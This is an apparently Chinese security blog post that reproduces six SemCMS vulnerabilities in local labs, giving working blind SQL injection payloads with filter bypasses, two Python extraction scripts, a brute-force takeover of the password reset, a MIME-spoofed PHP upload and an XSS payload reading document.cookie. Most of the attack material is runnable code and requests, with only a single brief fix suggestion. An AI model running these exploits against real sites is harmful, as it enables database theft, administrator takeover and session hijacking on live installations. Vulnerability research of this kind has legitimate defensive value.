> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_dPAGP2c1_F25QGbMobluQ)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

**作者：掌控安全 - 柚子**

> **一. Semcms PHP(多语) 版 V3.9 sql 注入漏洞**

#### **环境搭建**

semcms 是一个建设体积小，加载速度快, 数据移动方便的外贸网站，采用 php+mysql+apache 搭建

从官网下载源码，之后填入数据，安装即可。

http://www.sem-cms.com/xiazai.html

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reTXFKzLC1WXbpmHWQECR8GRkoXISwssIzCuLHicmiaTpSZGdo3zyLJBLw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reN0plAvHTaUoT2grwfjutbr21ud0pTFs5rcJOA3BicEyR8DtKzd0DTrw/640?wx_fmt=png)

#### **漏洞分析**

漏洞文件为 Include 下的 web_inc.php 文件，抓取数据包如下

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rewkLzIsAEQX9saxBp6iagJ6qKpPReKODNKoibgjFrJhvhwS3gVUzEnDHw/640?wx_fmt=png)查看 web_inc.php 的关键代码：可以看到查询语句没有利用单引号闭合  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reDrhAYwzYJcNnPyVOQ4moUYuu4eW2TKzXrG1MMJsHtoMGZrFWMMs6bA/640?wx_fmt=png)  
继续过滤函数查看：

```
function test_input($data) { 
      $data = str_replace("%", "percent", $data);
      $data = trim($data);
      $data = stripslashes($data);
      $data = htmlspecialchars($data,ENT_QUOTES);
      return $data;
   }
```

```
function inject_check_sql($sql_str) {

     return preg_match('/select|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str);

} 

function verify_str($str) { 

   if(inject_check_sql($str)) {

       exit('Sorry,You do this is wrong! (.-.)');

    } 

    return $str; 

}
```

过滤了一些关键字，正常的联合注入是没有办法了，可以时间盲注。

利用 if 和 sleep 构造 payload，因为 <,= 被过滤且存在 htmlspecialchars 函数，利用 like 代替

  
payload：

```
languageID=0orif(substr(database(),1,1) like 0x6e,sleep(5),1);


languageID=0orif(ascii(substr(database(),%s,1))-%s,1,sleep(5));
```

脚本：

```
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# author: Forthrglory


import requests


def getDatabase(url):
    s =''
    r = requests.session()
    head ={'Content-Type':'application/x-www-form-urlencoded'}
for i in range(1,9):
for j in range(32,122):
            data ='languageID=0 or if(ascii(substr(database(),%s,1))-%s,1,sleep(5));'%(i,j)


            result = r.post(url, data, headers=head)


if(result.elapsed.total_seconds()>5):
                s = s + chr(j)
print(s)
break
print('database='+ s)




def getUser(url):
    s =''
    r = requests.session()
    head ={'Content-Type':'application/x-www-form-urlencoded'}
for i in range(1,21):
for j in range(32,122):
            data ='languageID=0 or if(ascii(substr(user(),%s,1))-%s,1,sleep(5));'%(i,j)


            result = r.post(url, data, headers=head)


if(result.elapsed.total_seconds()>5):
                s = s + chr(j)
print(s)
break
print('user='+ s)


if __name__ =='__main__':
    url ='http://127.0.0.1/Include/web_inc.php'


    s = getDatabase(url)
    u = getUser(url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reTxsCGEtIVXrI9YnfMSNkBjdpcp1yJDm3f7oCadD99WlL7jExqWGrWg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reqx6nkCibbaaH5zle43GWqicwAs7pH421cQg5yFfqibALIqVAQyuEGzRyA/640?wx_fmt=png)

> **二. SemCms v2.7 版本存在 sql 注入漏洞**

SemCms 是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容 IE、Firefox 等主流浏览器。

SemCms 使用 PHP 和 vb 语言编写，结合 apache 或 iis 运行。

Semcms_InquiryView.php 文件存在 SQL 注入漏洞。

允许攻击者利用漏洞直接操作网站数据库。  

#### **漏洞分析**

打开 semcmsPHP-V2.7\Admin\Semcms_InquiryView.php 文件，会看到 ID 参数没有经过过滤，从而导致了 sql 注入漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6relVmyMpdRpzh2fzAkOyKJGAqwD01qot8TCEaYicQx0yZL87UsoEfEj6g/640?wx_fmt=png)  
  

但是 Semcms 有全局过滤

所以要继续查看 semcmsPHP-V2.7\include\web_sql.php 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reaia6qsKp0gTFRXibSkVa7VHK0Ofvn8y8UIV7nA8MP1OTlsu53OsaZgsg/640?wx_fmt=png)  
  

这里对 get 请求进行了一些过滤.

```
return preg_match('/select|insert|=|<|update|\'|\/\*|\*|union|into|load_file|outfile/i',$sql_str);
```

这段代码过滤了一些字符，但是 “>” 符号并没有进行过滤，我们可以用”>”进行延时注入。  

#### **漏洞复现**

从官网下载源码，之后填入数据，安装即可。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6redUcBdeO7RXNcF253KOa2Saib4shseqPxBCnspAJPT50wpM58yURsAmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reNUboSPyiaKZIU2Jeic6LFvrseBicibbp3srVibhlPmbK4YUVbwcIBaCS2tA/640?wx_fmt=png)  
  

用管理源账号登陆后台，访问 payload。

```
http://192.168.1.8/semcmsPHP-V2.7/gksg_Admin/SEMCMS_InquiryView.php?ID=1 and if(ascii(substring(user(),1,1))>113,sleep(5),1)
```

成功延时

```
http://192.168.1.8/semcmsPHP-V2.7/gksg_Admin/SEMCMS_InquiryView.php?ID=1 and if(ascii(substring(user(),1,1))>114,sleep(5),1)
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rezribcO1s9miaxIOSxTwDENDtxyAnHg4yv1tJHVb0g1uJWgibbjGjvCaYw/640?wx_fmt=png)

没有延时。证明 user() 第一个字符为 r 存在延时注入。

> **三. SemCMS v2.7 密码找回漏洞**

#### **漏洞分析**  

在本地搭建好环境, 访问后台的登陆页面。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6re0fEfonYuPTeARKOUVWlg90M6icmxLrEhZ2lc6icNEwTQLrx54MA0FCDw/640?wx_fmt=png)

先来看看正常的找回密码的过程。  

首先，查看 gksg_Admin/index.html 的源码：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reKtz2JFqhGfG3FFwcENeeHHNia5Xr5JM9hI7rYciaHekIcgkpWIwtKkVQ/640?wx_fmt=png)从代码可以看到，当点击登录按钮旁边的链接 “

如果忘记账号与密码，试试找回？”，时，会执行 js 的 views() 函数

该函数是弹出一个对话框并向 SEMCMS_Remail.php?type=find 发送请求，

让用户填写要接收重置后密码的邮箱地址，如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reHQFlloOYQzWSnAlWOBbUwic0NgZ8LNmesA2zJfdynRo0vSRVuohlKFg/640?wx_fmt=png)  

可以看到，就是构造上面那个要求输入 E-mail 的表单，点击 “确认找回” 按钮

该表单会提交到 ../Include/web_email.php?type=findpassword，

看一下 web_email.php 中 type=findpassword 时的代码：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reIVcVpwv28dmB0EoBxVXPxiaSkIvZvo4tSS2ebPXtO18iaBgKkuMGsAWg/640?wx_fmt=png)  

代码会根据用户输入的 E-mail 地址，查找 sc_user 表，看是否存在使用该 E-mail 地址的用户，如果存在，则随机生成 4 位数的认证码，并将其拼接到一个密码重置链接中，最后以邮件的形式发送给用户。

用户点击邮件中的密码重置链接即可；

但如果不存在，则弹出对话框，提示 “此邮箱不存在！”，如图：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6redln3OLOsWDnLOlBZNLibBKEkEoo5PNjoQW9fbQjXNicKd8wJ9mNv4xSg/640?wx_fmt=png)  
  

这里假设知道了管理员的邮箱，由于认证码是随机的 4 位数，这里很容易想到暴力破解。

但通过 ../Include/web_email.php?type=findpassword 无法进行暴力破解，因为如上面代码所示，每次进入 if ($Type == ‘findpassword’) 语句块，认证码会重新生成。

所以只能看看有没有别的地方可以利用。

再查看 index.html 的代码：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reqkvJxCfL6y9gsMZXqWMElAAHZ9giceaVaUXfNSUice2dV3LQAf2CQovg/640?wx_fmt=png)

当请求参数 type=ok 时，SEMCMS_Remail.php 后面跟的参数 type 也是 ok，

而前面提到，这种情况下，SEMCMS_Remail.php 会构造另外一个表单，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reJTe6biaTn1VG1UoFxkJmASaTLuL8LSoND12icSWckPk5vG2eic9OQHuWA/640?wx_fmt=png)

点击 “确认找回” 按钮，

会提交到 ../Include/web_email.php?type=findok，web_email.php 相应部分的代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reibWMIDQts0Xp1VJiaPPtOibIAtQVJia5qDYjGub8PyoWzYN3BYPuJ9ibuJA/640?wx_fmt=png)

可以看到，密码会经过 md5 加密后再存入数据库中。

因此，这里可以通过

http://192.168.1.8/semcmsPHP-V2.7/gksg_Admin/index.html?type=ok&umail=41864438@qq.com

弹出的表单，提交表单，使用 BurpSuite 进行暴力破解从而将密码重置。

#### **漏洞复现**

为了本地测试方便，所以将初始密码设置为 111111

其 md5 值为: 96e79218965eb72c92a549dd5a330112

重置后密码将变为 123456，MD5 加密后: e10adc3949ba59abbe56e057f20f883e

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reuXRNr3AjQ2BM1RVZGTbSp9Q6PQhsRBfwkxzKnjZqPgdReSZ89xLSAA/640?wx_fmt=png)

可以利用 python 生成一个四位数字的字典，或者说在在线工具生成一个响应的 4 位数字典也可以。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6re4au7fLbaOiaF7tZf4FntUuia58AQbT8PqCT1Z8ldy0oFNxibNZoqWsRXQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reibyMnHibeMtiaz3ypjeK7s3BM39dU1bibXEtpCZrbINfwvqfQkvdBTtd2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6re0fj6dOMS4YTJprUKMlZTaZGIgKvlic7QdOooBlop9icemcxwiaN9yoMaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reodsG7ULH9DNeic6224aB43s8BFmLtzQToszOapgHOP8x6osbhvLp4FA/640?wx_fmt=png)

结束后，查看数据库，发现密码确实被重置了：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reyOuJdszRKyxaf8RcHkNFJe1pw0QJqrwuIZ8rb6COpfmXO5TJgJNx2w/640?wx_fmt=png)

使用 Admin/123456 可以成功登陆后台管理页面：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reiclovibr27B4junoIW6TnnXjygiaYaibrIWCXejGqWpQhxDTbwSfMZ9dIw/640?wx_fmt=png)

> **四. SEMCMS_PHP_3.5 过滤不严导致 sql 注入**

#### **漏洞分析**  

首先查看首页文件 index.php 的代码

```
<?php

include_once  'Include/web_inc.php';

include_once  'Templete/default/Include/Function.php';

$file_url="";

include_once  'Templete/default/Include/default.php';

?>
```

可以看到这里包含了三个文件，继续查看文件 Include/web_inc.php 中发现有可控变量 $languageIDD

```
//网站logo



  $weblogo=$web_url_meate.str_replace('../','',$row['web_logo']);

// 控制文字标签 更改 获取的 语种 id

if(isset($_GET["languageIDD"])){$Language=test_input(verify_str($_GET["languageIDD"]));}else{$Language=verify_str($Language);}



if(!empty($Language)){

//网站SEO设定

       $query=$db_conn->query("select * from sc_tagandseo where languageID=$Language");

       $row=mysqli_fetch_array($query);

      $tag_indexmetatit=datato($row['tag_indexmetatit']);// 首页标题
```

在文件 Include/web_inc.php 的第 7 行中 verify_str() 和 test_input 函数会对变量 $languageIDD 进行处理, 它们都位于文件 include/contorl.php 中，代码如下

```
// 防sql入注



if(isset($_GET)){$GetArray=$_GET;}else{$GetArray='';} 　　

//所有GET方式提交的变量都进行防注入检查



foreach($GetArray as $value){//get



      verify_str($value);



}



function inject_check_sql($sql_str){



return preg_match('/select|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str);　　　　//过滤关键字 14 }



function verify_str($str){



if(inject_check_sql($str)){



exit('Sorry,You do this is wrong! (.-.)');　　//如果出现关键字则提示

}



return $str;

}
```

```
function test_input($data){ 　　　　　　　　　　　//防止XSS
       $data = str_replace("<script","", $data);
       $data = str_replace("</script>","", $data);
       $data = str_replace("%","percent", $data);
       $data = trim($data);
       $data = stripslashes($data);
       $data = htmlspecialchars($data,ENT_QUOTES);　　　　//实体编码
return $data;
}
```

可以看到函数 verify_str() 调用 inject_check_sql() 用来过滤危险字符，函数 test_input 用来过滤 xss。

其中可以明显地看到函数 inject_check_sql() 采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过。

#### **漏洞验证**

payload：

```
http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x72) rlike 0
```

正常显示  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6ret8z5U75wBVYfrXlyT0tNU3ibB4Z8OLsXEicE4RRK9Q3noLC1DCCtohgQ/640?wx_fmt=png)  
payload：

```
http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x73) rlike 0
```

显示不正常  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6regsHycuAOvtfGpwhJI3yUDmsTSdjVZaBicbCQD8icx0J592fTDp4CaX9g/640?wx_fmt=png)

参考网上已有的 fuzz 盲注脚本改了下，代码如下：

```
#用python3版本

import requests

url ="http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1"

print("Testing url: "+ url)

#十进制数33-126间的ascii hex值

payload =["0x21","0x22","0x23","0x24","0x25","0x26","0x27","0x28","0x29","0x2a",

"0x2b","0x2c","0x2d","0x2e","0x2f","0x30","0x31","0x32","0x33","0x34",

"0x35","0x36","0x37","0x38","0x39","0x3a","0x3b","0x3c","0x3d","0x3e",

"0x3f","0x40","0x41","0x42","0x43","0x44","0x45","0x46","0x47","0x48",

"0x49","0x4a","0x4b","0x4c","0x4d","0x4e","0x4f","0x50","0x51","0x52",

"0x53","0x54","0x55","0x56","0x57","0x58","0x59","0x5a","0x5b","0x5c",

"0x5d","0x5e","0x5f","0x60","0x61","0x62","0x63","0x64","0x65","0x66",

"0x67","0x68","0x69","0x6a","0x6b","0x6c","0x6d","0x6e","0x6f","0x70",

"0x71","0x72","0x73","0x74","0x75","0x76","0x77","0x78","0x79","0x7a",

"0x7b","0x7c","0x7d"

]

user =""

for b in range(len(payload)):

for a in payload:

#sql_payload_user = " and strcmp(substr(database(),%s,1), 0x%s) rlike 0" % (b+1, a.replace("0x",""))    #当前数据库名称

        sql_payload_user =" and strcmp(substr(user(),%s,1), 0x%s) rlike 0"%(b+1, a.replace("0x",""))#当前数据库用户名

        res = requests.get(url + sql_payload_user).text

        res1 = requests.get(url).text

if len(res)== len(res1):#如果返回的内容长度大小一样，则表示匹配成功

            user = user + a

print(" ")

print("[*]info : 0x"+ user.replace("0x","").upper())

break

else:

print('\r',"Match failed,Next.....",end='')
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6revGjuWk4cNUMRviagaFEibeZiaibRzQXB6eOKnvZ46Iqklicljxgh8xIhvvA/640?wx_fmt=png)

解码 ascii hex 值 0x726F6F74406C6F63616C686F7374 为 root@localhost。

> **五. SemCms2.0 存在文件上传漏洞**

#### **漏洞复现**  

访问后台的上传接口 xxxx_admin/SEMCMS_upload.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reqdXcuCf3FJIS5CfAia3xPLWo1ET42gFueKfrtzV19Sk6WbpOAR1pXow/640?wx_fmt=png)

http://192.168.1.8/SemCmsPHP-V2.0/nenq_Admin/SEMCMS_upload.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reofrT7bxRt4f9KOKCUbNZoejQq6ia0g7bHgX03MjxZfMwxjUk12PEOSA/640?wx_fmt=png)

新建文件 aaaaaa.php

```
<?php phpinfo();?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reY0NxpVyXKGVfnqN11dOuIxsp2QvxRR7XWqDYr6LricpRPCREZdel9tQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reo7kUymCibfX0AYzHGHyNw0YWRSUa5RUkIwXewdNhhjS0oWXo1SC8Ocg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reE9RAcfaUx6FINVf3n70tzTJASxWUO5WFTEQcaiasqz6enGqyoP9HqicA/640?wx_fmt=png)

#### **漏洞分析**

查看 SEMCMS_upload.php 源码，上传文件用到 SEMCMS_Upfile.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reU4M9zqibBz7eSa1W2EcrzeO5dibAY7gq2ux9Xjybl2QaeXSx4YIoZguw/640?wx_fmt=png)

接着查看 SEMCMS_Upfile.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reTdtBy8KwX49DhpYxoMxS6OTeqzx6OQr2NathKEM56hxE6GrCc3IcNA/640?wx_fmt=png)

这里对文件上传的过滤仅仅只是采取验证 MIME 的方式，这非常不安全

抓包看看刚刚上传的 php 文件

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reEicHqXD3sDHr9liaichSibWkbhSNrjZ8TUgE0LtURDicGMougfOZjjHNFAw/640?wx_fmt=png)

上传文件时的 MIME 设置成了 application/octex-stream，刚好过滤了判定，将其视为了 rar 压缩文件从而绕过

#### **漏洞利用及总结**

*   **利用**  
    上传任意文件，将 MIME 修改成白名单内的即可。
    
*   **修复**  
    建议加强验证、过滤，不单单采用验证 MIME，容易伪造。
    
*   **总结**  
    由于以下问题导致该漏洞的产生：1. 使用 MIME 松散判断文件类型 2. 只有一层验证文件类型的操作，效果弱
    

> **六. SemCms 后台登录地址显示处反射型 XSS**

#### **漏洞分析**  

后台登陆的时候，可以看到我登陆的 ip 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6revFRj3lG4qxXG4ywNhATHdGbNrqZcqBRHqzbSLz5gHFxApaKdo9Yq9g/640?wx_fmt=png)

http 请求头！！client-ip x-forward-ip x-real-ip remote-addr 字段  

然后我就试了 cliten-ip 字段，我把他改成 1234 登录了一次

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6redLpKFkKD8LB40lSGXj7JfRiaPQvEG0zeTNzc08cvuPsPia6JPgf9xQnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6reR8ic3QZUSiaqOLjah7bpoibtFlswlDo987jXEId6q3YlxVo4NhyLrunPQ/640?wx_fmt=png)  
接着 IP 地址的地方就变成了 1234。

我们再看这个值在源代码中式怎么展示的，审查元素

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rewoYwTqeOZmtxDWUB8Ux9cOocTdpJ3Hkjfnx9kupFZG5oX43huE7vyg/640?wx_fmt=png)

被 <span> 标签包围了。

#### **漏洞复现**

根据上面的分析，我们可以构造出如下 payload

```
123</span><img src onerror=alert(document.cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rebCPicI9UkzjODjCdShyy9cYTH4AoO0Sw7fUbIknupqCazMlfsIlibYTQ/640?wx_fmt=png)

这个时候返回信息里就用账号名和密码。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rez0TSRyiarUiaymR25ViaYu49oALX7fQQOeAjuVwgvicU36tMyAPpXps87A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoiamlreVg3KIAnt2Jaibt6rePefRyZrOnEdBHAtnLpXJET1ND2ToNozVIEPiaTibBSVhrslJlwAjcUdw/640?wx_fmt=png)

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[POC 批量验证 Python 脚本编写](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504664&idx=1&sn=e88c77671f252631de939c154de075db&chksm=fa6baa69cd1c237f1c1f35f8b434874341f7fe077452834dac0e289addf9ac56fcbf7df5a8a1&scene=21#wechat_redirect)

[实战纪实 | SQL 漏洞实战挖掘技巧](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247497717&idx=1&sn=34dc1d10fcf5f745306a29224c7c4008&chksm=fa6b8e84cd1c0792f0ec433310b24b4ccbe53354c11f334a1b0d5f853d214037bdba7ea00a9b&scene=21#wechat_redirect)  

[渗透工具 | 红队常用的那些工具分享](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247495811&idx=1&sn=122c664b1178d563ef5e071e0bfd7e28&chksm=fa6b89f2cd1c00e4327d6516c25fcfd2616cf7ae8ddef2a6e869b4a6ab6afad2a6788bf0d04a&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**
